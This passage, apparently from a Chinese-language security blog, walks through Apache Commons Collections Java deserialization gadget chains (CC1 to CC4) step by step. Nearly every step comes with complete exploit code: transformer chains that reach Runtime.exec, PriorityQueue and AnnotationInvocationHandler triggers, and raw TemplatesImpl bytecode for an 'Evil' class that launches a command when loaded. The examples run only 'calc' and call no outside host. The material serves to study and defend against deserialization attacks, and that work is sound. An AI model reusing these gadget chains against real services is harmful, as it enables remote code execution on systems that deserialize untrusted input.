97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 4, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 1, 0, 17, 0, 18, 0, 2, 0, 12, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 21, 0, 14, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 21, 0, 22, 0, 2, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 1, 0, 17, 0, 25, 0, 2, 0, 12, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 26, 0, 14, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 26, 0, 27, 0, 2, 0, 0, 0, 1, 0, 28, 0, 29, 0, 3, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 8, 0, 30, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 12, 0, 9, 0, 15, 0, 12, 0, 13, 0, 13, 0, 14, 0, 22, 0, 16, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 31, 0, 32, 0, 0, 0, 33, 0, 0, 0, 7, 0, 2, 76, 7, 0, 34, 9, 0, 1, 0, 35, 0, 0, 0, 2, 0, 36, &#125;&#125;;
        TemplatesImpl templates = new TemplatesImpl();
        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
        fieldBytecodes.setAccessible(true);
        fieldName.setAccessible(true);
        fieldTfactory.setAccessible(true);
        fieldBytecodes.set(templates,_bytecodes);
        fieldName.set(templates,&quot;aa&quot;);
        fieldTfactory.set(templates,new TransformerFactoryImpl());



        Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, new ConstantTransformer(1), chainedTransformer);

        Class&lt;?&gt; AIHClazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = AIHClazz.
                getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Action.class, decoratedMap);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);

        Map finalMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invocationHandler);

        Object object =  constructor.newInstance(Action.class, finalMap);

        byte[] bytes = serialize(templates);
        unSerialize(bytes);



    &#125;



    public static byte[] serialize(Object obj) throws IOException &#123;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    &#125;

    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return  ois.readObject();
    &#125;
&#125;
</code></pre>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755794.png" alt="image-20240224124450342"></p>
<p>evil.java如下</p>
<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet &#123;
    static &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;calc&quot;);
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;

    &#125;

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;

    &#125;
&#125;
</code></pre>
<h1 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h1><p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755444.png" alt="image-20240302234706356"></p>
<p>相较于CC2 使用了InstantiateTransformer 代替 InvokerTransformer</p>
<p>类似cc3和cc1的关系</p>
<pre><code>Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            ...
                TransformingComparator.compare()
                    InstantiateTransformer.transform()
                        TemplatesImpl.newTransformer()
                            getTransletInstance()
                                defineTransletClasses()
                                    defineClass()
</code></pre>
<p>链子拼一下就好了</p>
<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
        byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 54, 10, 0, 9, 0, 37, 10, 0, 38, 0, 39, 8, 0, 40, 10, 0, 38, 0, 41, 7, 0, 42, 7, 0, 43, 10, 0, 6, 0, 44, 7, 0, 45, 7, 0, 46, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 47, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 105, 116, 101, 114, 97, 116, 111, 114, 1, 0, 53, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 42, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 48, 12, 0, 49, 0, 50, 1, 0, 4, 99, 97, 108, 99, 12, 0, 51, 0, 52, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 53, 1, 0, 4, 69, 118, 105, 108, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 4, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 1, 0, 17, 0, 18, 0, 2, 0, 12, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 21, 0, 14, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 21, 0, 22, 0, 2, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 1, 0, 17, 0, 25, 0, 2, 0, 12, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 26, 0, 14, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 26, 0, 27, 0, 2, 0, 0, 0, 1, 0, 28, 0, 29, 0, 3, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 8, 0, 30, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 12, 0, 9, 0, 15, 0, 12, 0, 13, 0, 13, 0, 14, 0, 22, 0, 16, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 31, 0, 32, 0, 0, 0, 33, 0, 0, 0, 7, 0, 2, 76, 7, 0, 34, 9, 0, 1, 0, 35, 0, 0, 0, 2, 0, 36, &#125;&#125;;
        TemplatesImpl templates = new TemplatesImpl();
        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
        fieldBytecodes.setAccessible(true);
        fieldName.setAccessible(true);
        fieldTfactory.setAccessible(true);
        fieldBytecodes.set(templates,_bytecodes);
        fieldName.set(templates,&quot;aa&quot;);
        fieldTfactory.set(templates,new TransformerFactoryImpl());


        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
        &#125;;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
        priorityQueue.add(2);
        priorityQueue.add(1);

        Field field = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
        field.setAccessible(true);
        field.set(transformingComparator,chainedTransformer);

        byte[] bytes = serialize(priorityQueue);
        unSerialize(bytes);
    &#125;




    public static byte[] serialize(Object obj) throws IOException &#123;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    &#125;

    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return  ois.readObject();
    &#125;
&#125;
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #03a9f4">java</a>
        </span>
        
    </div>
    <a href="/2024/03/03/CommonsCollections3-4/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/02/25/CommonCollections2/">
        <h2 class="post-title">CommonCollections2</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/25
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h1><pre><code class="ini">Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            ...
                TransformingComparator.compare()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
</code></pre>
<p>可以发现 TransformingComparator之后都和之前一样 那么原样照抄之前的</p>
<p>然后跟进TransformingComparator#compare</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231949456.png" alt="image-20240223194926819"></p>
<p>往上PriorityQueue#siftDownUsingComparator</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757329.png" alt="image-20240224093144503"></p>
<p>在PriorityQueue#readObject中调用了heapify heapify调用siftDown siftDown调用siftDownUsingComparator</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757286.png" alt="image-20240224094834202"></p>
<p> 这里comparator要非空 且我们最终调的就是comparator的compare</p>
<p>也就是这里的comparator需要是我们的恶意类</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757295.png" alt="image-20240224095015629"></p>
<p>在这个构造函数中可以传</p>
<p>于是构造</p>
<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
</code></pre>
<p>然后来看具体的heapify代码 看看能走到compare需要的条件</p>
<p>直接打断点看看哪儿不满足 不满足的再改</p>
<p>要想进siftDown size要至少为2</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757310.png" alt="image-20240224095705752"></p>
<p>于是给PriorityQueue add俩元素</p>
<pre><code class="java">import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.util.PriorityQueue;

public class CC2 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

//        new InvokerTransformer().transform()
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
        priorityQueue.add(2);
        priorityQueue.add(1);
//        byte[] bytes = serialize(priorityQueue);
//        unSerialize(bytes);
    &#125;




    public static byte[] serialize(Object obj) throws IOException &#123;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    &#125;

    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return  ois.readObject();
    &#125;
&#125;
</code></pre>
<p>但是发现这里还没有反序列化就弹计算器了</p>
<p>原因是在add的时候会调offer</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757342.png" alt="image-20240224100054276"></p>
<p>offer中的siftUp 最终会调用到compare </p>
<p>为了避免这种情况我们需要反射赋值TransformingComparator</p>
<p>不管的话会抛异常终止程序运行</p>
<pre><code class="java">import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1,transformingComparator);
        priorityQueue.add(2);
        priorityQueue.add(1);

        Field field = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
        field.setAccessible(true);
        field.set(transformingComparator,chainedTransformer);

//        byte[] bytes = serialize(priorityQueue);
//        unSerialize(bytes);
    &#125;




    public static byte[] serialize(Object obj) throws IOException &#123;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    &#125;

    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return  ois.readObject();
    &#125;
&#125;
</code></pre>
<p>此时反序列化就能弹计算器了</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402251757615.png" alt="image-20240224100659049"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #ff7d73">java</a>
        </span>
        
    </div>
    <a href="/2024/02/25/CommonCollections2/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/02/24/CommonCollections1/">
        <h2 class="post-title">CommonCollections1</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/2/24
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><h2 id="CommonsCollections1-TransformedMap"><a href="#CommonsCollections1-TransformedMap" class="headerlink" title="CommonsCollections1  (TransformedMap)"></a>CommonsCollections1  (TransformedMap)</h2><p>那就可以正式开始跟链子了</p>
<p>逆着跟 首先考虑在哪里调用了transform 因为我们的命令调用的最终以transform结束</p>
<p><code>alt+f7 find Usage</code></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939669.png" alt="image-20240201140759741"></p>
<p>这里代码随便写点 目的就是看谁调用了transform方法</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939478.png" alt="image-20240201140853784"></p>
<p>这里选择跟进TransformedMap</p>
<p>为什么? 因为这就是CC1(</p>
<p>这里选择不同的类会影响最终是否能走到readObject 即链子就不同了 这里我们考虑的是CC1 所以这么跟进</p>
<p>如果是自己在找链子 可以都看看 直到找到可用的中间类</p>
<p>事实上lazyMap那个也是CC1的 那个是中国的版本记不太清了</p>
<p>后面也会分析</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939055.png" alt="image-20240201141158091"></p>
<p>这里TransformedMap下有三个方法调用到了transform</p>
<p>跟进checkSetValue</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939691.png" alt="image-20240201144027308"></p>
<p>这里对valueTransformer调了transform</p>
<p>也就是我们最终要在TransformedMap中的value添加恶意对象</p>
<p>然后找谁调了checkSetValue</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939480.png" alt="image-20240201144851430"></p>
<p>这里调用了父类的checkSetValue</p>
<p>这里的entry就是遍历集合的时候元素</p>
<p>所以当遍历TransformedMap的时候就会调用</p>
<p>我们可以写一个Demo测一下</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939244.png" alt="image-20240201145659951"></p>
<p>可以下个断点跟进去看看是不是和我们之前说的是一样的</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939967.png" alt="image-20240201145813068"></p>
<p>那么继续跟</p>
<p>现在去看谁调用了setValue</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939281.png" alt="image-20240201150650553"></p>
<p>AnnotationInvocationHandler#readObject</p>
<p>这里已经是终点了</p>
<p>当AnnotationInvocationHandler的对象被反序列化时会调用readObject</p>
<p>对其中的memberValue进行setValue</p>
<p>那么我们跟过去看看memberValues 这就是一个map</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402231939743.png" alt="image-20240201151043746">我们可以通过构造函数进行赋值</p>
<p>注意这里类也是非public的 需要用反射去拿</p>
<p>于是尝试构造如下</p>
<pre><code class="java">import jdk.nashorn.internal.objects.annotations.Setter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;


public class TransformerTest &#123;
    public static void main(String[] args) throws Exception &#123;
        HashMap hashMap = new HashMap();
        hashMap.put(1,2);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, new ConstantTransformer(1), chainedTransformer);

        Class&lt;?&gt; AIHClazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = AIHClazz.getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);
        constructor.setAccessible(true);
